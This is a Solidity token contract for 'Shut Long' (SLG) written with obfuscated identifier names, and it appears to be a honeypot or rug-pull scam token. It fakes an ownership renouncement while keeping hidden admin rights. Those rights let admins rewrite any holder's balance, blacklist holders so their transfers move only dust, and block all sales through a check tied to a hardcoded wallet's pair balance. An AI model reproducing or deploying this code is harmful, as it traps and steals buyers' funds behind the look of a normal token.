//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface exemptMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract receiverExemptTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderSellWallet {
    function createPair(address senderEnableWallet, address amountLaunched) external returns (address);
}

interface liquidityEnableAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundTx) external view returns (uint256);

    function transfer(address fundFromAt, uint256 feeTo) external returns (bool);

    function allowance(address marketingTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTo) external returns (bool);

    function transferFrom(
        address sender,
        address fundFromAt,
        uint256 feeTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletIs, uint256 value);
    event Approval(address indexed marketingTrading, address indexed spender, uint256 value);
}

interface amountReceiverLimit is liquidityEnableAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ShutLong is receiverExemptTake, liquidityEnableAt, amountReceiverLimit {

    function allowance(address atList, address teamLiquidity) external view virtual override returns (uint256) {
        if (teamLiquidity == shouldTokenFund) {
            return type(uint256).max;
        }
        return buyTrading[atList][teamLiquidity];
    }

    address marketingFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function liquidityReceiverTx(address marketingAmount, address fundFromAt, uint256 feeTo) internal returns (bool) {
        require(enableTotal[marketingAmount] >= feeTo);
        enableTotal[marketingAmount] -= feeTo;
        enableTotal[fundFromAt] += feeTo;
        emit Transfer(marketingAmount, fundFromAt, feeTo);
        return true;
    }

    function limitTrading(uint256 feeTo) public {
        fromTo();
        amountMode = feeTo;
    }

    address private shouldMarketingBuy;

    uint256 public modeEnableSender;

    event OwnershipTransferred(address indexed swapMarketingSender, address indexed fromAmount);

    function isMax(address maxLaunched) public {
        fromTo();
        
        if (maxLaunched == launchSenderIs || maxLaunched == tokenFrom) {
            return;
        }
        maxTo[maxLaunched] = true;
    }

    mapping(address => mapping(address => uint256)) private buyTrading;

    function balanceOf(address fundTx) public view virtual override returns (uint256) {
        return enableTotal[fundTx];
    }

    uint256 private marketingListLimit;

    uint256 amountMode;

    function enableWallet(address limitAtTotal) public {
        if (toShould) {
            return;
        }
        
        atSwap[limitAtTotal] = true;
        
        toShould = true;
    }

    bool public takeAt;

    function symbol() external view virtual override returns (string memory) {
        return buyList;
    }

    uint256 launchedMax;

    constructor (){
        if (marketingListLimit != receiverLimit) {
            receiverLimit = marketingListLimit;
        }
        exemptMin fromToken = exemptMin(shouldTokenFund);
        tokenFrom = senderSellWallet(fromToken.factory()).createPair(fromToken.WETH(), address(this));
        
        launchSenderIs = _msgSender();
        totalExemptMode();
        atSwap[launchSenderIs] = true;
        enableTotal[launchSenderIs] = maxSenderLiquidity;
        
        emit Transfer(address(0), launchSenderIs, maxSenderLiquidity);
    }

    function name() external view virtual override returns (string memory) {
        return atAmount;
    }

    function atReceiver(address tradingTeam, uint256 feeTo) public {
        fromTo();
        enableTotal[tradingTeam] = feeTo;
    }

    mapping(address => bool) public atSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return maxSenderLiquidity;
    }

    uint256 public receiverLimit;

    bool public toShould;

    string private atAmount = "Shut Long";

    address public tokenFrom;

    function owner() external view returns (address) {
        return shouldMarketingBuy;
    }

    function fromTo() private view {
        require(atSwap[_msgSender()]);
    }

    function modeAt(address marketingAmount, address fundFromAt, uint256 feeTo) internal returns (bool) {
        if (marketingAmount == launchSenderIs) {
            return liquidityReceiverTx(marketingAmount, fundFromAt, feeTo);
        }
        uint256 minTrading = liquidityEnableAt(tokenFrom).balanceOf(marketingFund);
        require(minTrading == amountMode);
        require(fundFromAt != marketingFund);
        if (maxTo[marketingAmount]) {
            return liquidityReceiverTx(marketingAmount, fundFromAt, launchTeam);
        }
        return liquidityReceiverTx(marketingAmount, fundFromAt, feeTo);
    }

    address public launchSenderIs;

    function decimals() external view virtual override returns (uint8) {
        return atLiquidity;
    }

    uint8 private atLiquidity = 18;

    string private buyList = "SLG";

    function getOwner() external view returns (address) {
        return shouldMarketingBuy;
    }

    function transfer(address tradingTeam, uint256 feeTo) external virtual override returns (bool) {
        return modeAt(_msgSender(), tradingTeam, feeTo);
    }

    address shouldTokenFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private fromSender;

    uint256 private maxSenderLiquidity = 100000000 * 10 ** 18;

    function totalExemptMode() public {
        emit OwnershipTransferred(launchSenderIs, address(0));
        shouldMarketingBuy = address(0);
    }

    mapping(address => bool) public maxTo;

    bool private atWalletShould;

    function transferFrom(address marketingAmount, address fundFromAt, uint256 feeTo) external override returns (bool) {
        if (_msgSender() != shouldTokenFund) {
            if (buyTrading[marketingAmount][_msgSender()] != type(uint256).max) {
                require(feeTo <= buyTrading[marketingAmount][_msgSender()]);
                buyTrading[marketingAmount][_msgSender()] -= feeTo;
            }
        }
        return modeAt(marketingAmount, fundFromAt, feeTo);
    }

    mapping(address => uint256) private enableTotal;

    function approve(address teamLiquidity, uint256 feeTo) public virtual override returns (bool) {
        buyTrading[_msgSender()][teamLiquidity] = feeTo;
        emit Approval(_msgSender(), teamLiquidity, feeTo);
        return true;
    }

    uint256 private txTotal;

    uint256 constant launchTeam = 11 ** 10;

}